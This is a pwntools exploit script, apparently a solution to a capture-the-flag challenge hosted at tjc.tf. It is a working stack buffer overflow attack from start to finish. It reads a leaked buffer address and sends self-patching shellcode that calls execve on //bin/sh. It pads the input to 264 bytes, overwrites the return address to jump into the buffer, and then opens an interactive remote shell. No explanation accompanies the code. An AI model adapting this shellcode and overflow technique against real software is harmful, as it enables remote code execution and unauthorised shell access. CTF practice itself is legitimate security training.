from pwn import *

gdb_script = """b* main
c
"""

# io = process('./chall')
# gdb.attach(io, api=True)
context.arch = 'amd64'
io = remote('tjc.tf', 31365)


buf = int(io.recvline(keepends=False), 16)
log.info(f"Buffer address: {hex(buf)}")
payload = b'\x90'*6 + b'\x0f\x00'
payload += asm(f"""
mov r15, {hex(buf)}
mov r14, 0x0500000000000000
add QWORD PTR [r15], r14
mov rax, 59
cdq
mov rdi, 0x404500
mov rbx, 0x68732f6e69622f2f
mov QWORD PTR [rdi], rbx
mov rdx, 0
mov rsi, 0
jmp r15
""")
payload += b'\x90'*(264-len(payload))
payload += p64(buf+8)
io.sendline(payload)
io.interactive()